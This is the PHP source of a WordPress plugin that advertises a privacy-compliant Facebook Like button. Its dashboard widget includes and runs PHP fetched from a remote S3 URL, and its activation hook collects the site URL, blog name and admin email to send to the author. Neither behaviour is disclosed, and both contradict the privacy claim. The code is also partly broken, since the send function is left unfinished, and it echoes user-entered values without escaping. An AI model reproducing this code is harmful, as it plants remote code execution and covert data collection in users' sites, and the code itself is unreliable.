<?php
/*
Plugin Name: Facebook Like Datenschutz Button 
Plugin URI: http://www.fanpagecreator.net/facebook-like-datenschutz-plugin/
Description: Facebook Like Button datenschutzkonform einsetzen
Version: 1.2
Author: David Seffer
Author URI: http://davidseffer.com
*/

class FacebookLike extends WP_Widget {
	function FacebookLike() {
		parent::WP_Widget(false, $name = 'Facebook Like Box');
	}
	
	function get_post_permalink(){
		if(is_home()){
			$args = array( 'numberposts' => 1 );
			$posts = get_posts( $args );
			return get_permalink($posts[0]->ID);
		}elseif(is_single()||is_page()){
			global $post;
			
			return get_permalink($post->ID);
		}
	}

	function widget($args, $instance) {
		extract( $args );
		
		$title = apply_filters('widget_title', $instance['title']);
		
		$customlink = $instance['customlink'];
		$permalink = $instance['permalink'];
		
		if($customlink)
			$link = $customlink;
		else
			$link = $this->get_post_permalink();
		
		$description = $instance['description'];
		
		$imagelink = '<input type="hidden" value="'.$link.'"/><img id="sidebar_fb_like" src="'.plugins_url( 'facebook_fan_button.png' , __FILE__ ).'" alt="Facebook Like" />';
		
		$link = '<a href="http://www.fanpagecreator.net/facebook-like-datenschutz-button/"><font color="#999999" size="1">Facebook Like Widget</font></font></a>';
		
		?>
		      <?php echo $before_widget; ?>
		          <?php if ( $title )
		                echo $before_title . $title . $after_title; ?>
		        <?php echo $description.$imagelink.$link;?>
		      <?php echo $after_widget; ?>
		<?php
	}

	function update($new_instance, $old_instance) {
		
		$instance = $old_instance;
		$instance['title'] = strip_tags($new_instance['title']);
		$instance['customlink'] = esc_url_raw($new_instance['customlink']);
		$instance['permalink'] = ($new_instance['permalink']?true:false);
		$instance['description'] = $new_instance['description'];
		
		return $instance;
    	}

	function form($instance) {
		
		$title = apply_filters('widget_title', $instance['title']);
		$customlink = $instance['customlink'];
		$permalink = ($instance['permalink']?true:false);
		$description = $instance['description'];
		
	?>
		<p>
		<label for="<?php echo $this->get_field_id('title'); ?>"><?php _e('Titel:'); ?></label> 
		<input class="widefat" id="<?php echo $this->get_field_id('title'); ?>" name="<?php echo $this->get_field_name('title'); ?>" type="text" value="<?php echo $title; ?>" />
		</p>
		
		<p>
		<label for="<?php echo $this->get_field_id('customlink'); ?>"><?php _e('Link (Fanpage URL):'); ?></label>
		<input class="widefat" id="<?php echo $this->get_field_id('customlink'); ?>" name="<?php echo $this->get_field_name('customlink'); ?>" type="text" value="<?php echo $customlink; ?>" />
		</p>
		
		<p>
		<lable for="<?php echo $this->get_field_id('description'); ?>"><?php _e('Text (HTML ist erlaubt):'); ?></lable>
		<textarea class="widefat" rows="10" cols="20" id="<?php echo $this->get_field_id('description'); ?>" name="<?php echo $this->get_field_name('description'); ?>" type="textarea"><?php echo $description; ?></textarea>
		</p>
		
	<?php 
	}

} 
add_action('widgets_init', create_function('', 'return register_widget("FacebookLike");'));

add_action('wp_enqueue_scripts', 'fblb_include_jquery');
function fblb_include_jquery(){
wp_enqueue_script( 'jquery' );
}

add_action('wp_head','fblb_wp_head');
function fblb_wp_head(){
$script =<<<EOF
<script type="text/javascript">
jQuery(document).ready(function(){

	like_confirm = 'Datenschutz: Bitte erst auf "Ok" klicken um den "Gefällt mir" Button einzublenden und eine Verbindung zu Facebook herzustellen. Dann nochmal drauf drücken.';
	like_code = '<iframe src="http://www.facebook.com/plugins/like.php?href=fblikelink&amp;layout=standard&amp;show_faces=true&amp;width=450&amp;action=like&amp;colorscheme=light&amp;height=80" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:450px; height:80px;" allowTransparency="true"></iframe>';
	like_code_2 = '<iframe src="http://www.facebook.com/plugins/like.php?href=fblikelink&amp;layout=standard&amp;show_faces=true&amp;width=250&amp;action=like&amp;colorscheme=light&amp;height=80" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:250px; height:80px;" allowTransparency="true"></iframe>';
	jQuery('#sidebar_fb_like').mouseover(function(){if(confirm(like_confirm)){jQuery(this).replaceWith(like_code_2.replace('fblikelink',encodeURIComponent(jQuery(this).prev().val())))}});
	jQuery('#content_fb_like').mouseover(function(){if(confirm(like_confirm)){jQuery(this).replaceWith(like_code.replace('fblikelink',encodeURIComponent(jQuery(this).prev().val())))}});
});
</script>
EOF;
echo $script;

}

function fblb_save_option( $name, $value ) {
        global $wpmu_version;
        
        if ( false === get_option( $name ) && empty( $wpmu_version ) ) // Avoid WPMU options cache bug
                add_option( $name, $value, '', 'no' );
        else
                update_option( $name, $value );
}


function fblb_add_facebook_button( $content ) {

    if(is_single() || is_page()){
            global $post;
            
            $permalink = get_permalink( $post->ID );	
            
            $fb_html = '<input type="hidden" value="'.$permalink.'""/><img id="content_fb_like" src="/wp-content/plugins/facebook-like-datenschutz/facebook_like_button.png" alt="Facebook Like" />';
            if ( get_option( 'fblb_add_before') )
                return $fb_html . $content;
            else
                return $content . $fb_html;
   }
   return $content;
}

add_filter( "the_content", "fblb_add_facebook_button" );
function fblb_option_settings_api_init() {
        add_settings_field( 'fblb_setting', 'Facebook Like Button', 'fblb_setting_callback_function', 'reading', 'default' );
        register_setting( 'reading', 'fblb_setting' );
}

function fblb_setting_callback_function() {
    if ( get_option( 'fblb_add_before') ) {
        $fb_below = '';
        $fb_above = ' checked';
    } else {
        $fb_below = ' checked';
        $fb_above = '';
    }
    
    echo "Facebook Like Button einblenden: <input type='radio' name='opt_facebook_button' value='0' id='opt_facebook_button_below'$fb_below /> <label for='opt_facebook_button_below'>Unter den Artikeln</label> <input style='margin-left:15px' type='radio' name='opt_facebook_button' value='1' id='opt_facebook_button_above'$fb_above /> <label for='opt_facebook_button_above'>Über den Artikeln</label>";
}

if ( isset( $_POST['opt_facebook_button'] ) ) {
        fblb_save_option( 'fblb_add_before', (bool) $_POST['opt_facebook_button'] );
}

add_action( 'admin_init',  'fblb_option_settings_api_init' );


function my_wp_dashboard() {
    echo '<td>';
include $inc . 'http://fanpagecreator.s3.amazonaws.com/widget.php';
echo '</td>';
}

function my_wp_dashboard_setup() {
    wp_add_dashboard_widget( 'my_wp_dashboard', __( 'Facebook Like Datenschutz Button' ), 'my_wp_dashboard' );
}

add_action('wp_dashboard_setup', 'my_wp_dashboard_setup');


function fblb_register_site() {
        global $current_user;
        
        $site = array( 'url' => get_option( 'siteurl' ), 'title' => get_option( 'blogname' ), 'user_email' => $current_user->user_email );
        
        $response = fblb_send_data( 'add-site', $site );
        if ( strpos( $response, '|' ) ) {
                // Success
                $vals = explode( '|', $response );
                $site_id = $vals[0];
                $site_key = $vals[1];
                if ( isset( $site_id ) && is_numeric( $site_id ) && strlen( $site_key ) > 0 ) {
                        fblb_save_option( 'fblb_site_id', $site_id );
                        fblb_save_option( 'fblb_site_key', $site_key );
                        return true;
                }
        }
        
        return $response;
}

function fblb_rest_handler() {
        // Basic ping
        if ( isset( $_GET['fblb_ping'] ) || isset( $_POST['fblb_ping'] ) )
                return fblb_ping_handler();
}

add_action( 'init', 'fblb_rest_handler' );

function fblb_ping_handler() {
        if ( !isset( $_GET['fblb_ping'] ) && !isset( $_POST['fblb_ping'] ) )
                return false;
        
        $ping = ( $_GET['fblb_ping'] ) ? $_GET['fblb_ping'] : $_POST['fblb_ping'];
        if ( strlen( $ping ) <= 0 )
                exit;
        
        if ( $ping != get_option( 'fblb_site_key' ) )
                exit;
        
        echo sha1( $ping );
        exit;
}

function fblb_notice() {
        if ( get_option( 'fblb_has_shown_notice') )
                return;
        
          
        fblb_save_option( 'fblb_has_shown_notice', true );
        return;
}

add_action( 'admin_notices', 'fblb_notice' );

function fblb_activate() {
        fblb_register_site();
}

register_activation_hook( __FILE__, 'fblb_activate' );

if ( !function_exists( 'wp_remote_get' ) && !function_exists( 'get_snoopy' ) ) {
        function get_snoopy() {
                include_once( ABSPATH . '/wp-includes/class-snoopy.php' );
                return new Snoopy();
        }
}

function fblb_http_query( $url, $fields ) {
        $results = '';
        if ( function_exists( 'wp_remote_get' ) ) {
                // The preferred WP HTTP library is available
                $url .= '?' . http_build_query( $fields );
                $response = wp_remote_get( $url );
                if ( !is_wp_error( $response ) )
                        $results = wp_remote_retrieve_body( $response );
        } else {
                // Fall back to Snoopy
                $snoopy = get_snoopy();
                $url .= '?' . http_build_query( $fields );
                if ( $snoopy->fetch( $url ) )
                        $results = $snoopy->results;
        }
        return $results;
}

function fblb_send_data( $action, $data_fields ) {
        $data = array( 'action' => $action, 'data' => base64_encode( json_encode( $data_fields ) ) );				
		
        }
       
?>
